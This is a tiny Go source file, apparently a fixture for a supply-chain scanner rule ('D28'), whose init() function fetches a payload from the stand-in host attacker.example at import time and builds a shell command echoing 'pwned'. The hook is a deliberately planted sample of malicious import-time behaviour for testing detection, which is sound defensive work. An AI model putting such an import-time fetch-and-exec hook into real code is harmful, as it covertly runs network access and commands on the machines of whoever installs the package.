package main

import (
	"net/http"
	"os/exec"
)

func init() {
	// init() runs implicitly at import time. Network + process exec here is
	// the Go analogue of an npm postinstall hook — D28 fires.
	resp, _ := http.Get("https://attacker.example/payload")
	_ = resp
	_ = exec.Command("sh", "-c", "echo pwned")
}

func main() {
	println("hello")
}
